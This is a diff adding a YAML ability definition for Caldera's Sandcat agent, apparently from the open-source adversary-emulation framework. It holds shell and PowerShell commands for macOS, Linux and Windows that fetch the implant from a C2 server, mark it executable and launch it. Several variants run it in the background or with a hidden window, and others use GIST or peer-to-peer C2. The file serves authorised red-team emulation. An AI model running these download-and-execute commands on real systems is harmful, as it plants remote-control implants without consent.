@@ -1,0 +1,180 @@
+---
+
+- id: 2f34977d-9558-4c12-abad-349716777c6b
+  name: Sandcat
+  description: Caldera's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    darwin:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -server $server -v
+        variations:
+          - description: (AMD64) Deploy as a blue-team agent instead of red
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server -group blue &
+          - description: (AMD64) Download with a random name and start as a background process
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server &
+          - description: (AMD64) Compile red-team agent with a comma-separated list of extensions (requires GoLang).
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -v
+          - description: (AMD64) Download with GIST C2
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -c2 GIST -v
+          - description: (AMD64) Deploy as a P2P agent with known peers included in compiled agent
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -listenP2P -v
+          - description: (ARM64) Caldera's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -v
+          - description: (ARM64) Deploy as a blue-team agent instead of red
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server -group blue &
+          - description: (ARM64) Download with a random name and start as a background process
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server &
+          - description: (ARM64) Compile red-team agent with a comma-separated list of extensions (requires GoLang).
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -v
+          - description: (ARM64) Download with GIST C2
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -c2 GIST -v
+          - description: (ARM64) Deploy as a P2P agent with known peers included in compiled agent
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -listenP2P -v
+    linux:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -server $server -group red -v
+        variations:
+          - description: Deploy as a blue-team agent instead of red
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server -group blue &
+          - description: Download with a random name and start as a background process
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server &
+          - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -group red -v
+          - description: Download with GIST C2
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -c2 GIST -v
+          - description: Deploy as a P2P agent with known peers included in compiled agent
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -listenP2P -v
+    windows:
+      psh:
+        command: |
+          $server="#{app.contact.http}";
+          $url="$server/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("platform","windows");
+          $wc.Headers.add("file","sandcat.go");
+          $data=$wc.DownloadData($url);
+          get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+          rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+          [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+          Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+        variations:
+          - description: Deploy as a blue-team agent instead of red
+            command: |
+              $server="#{app.contact.http}";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","sandcat.go");
+              $data=$wc.DownloadData($url);
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
+          - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
+            command: |
+              $server="#{app.contact.http}";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","sandcat.go");
+              $wc.Headers.add("gocat-extensions", "#{agent.extensions}");
+              $data=$wc.DownloadData($url);
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+          - description: Deploy as a P2P agent with known peers included in compiled agent
+            command: |
+              $server="#{app.contact.http}";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","sandcat.go");
+              $wc.Headers.add("gocat-extensions","proxy_http");
+              $wc.Headers.add("includeProxyPeers","HTTP");
+              $data=$wc.DownloadData($url);
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red -listenP2P -v" -WindowStyle hidden;
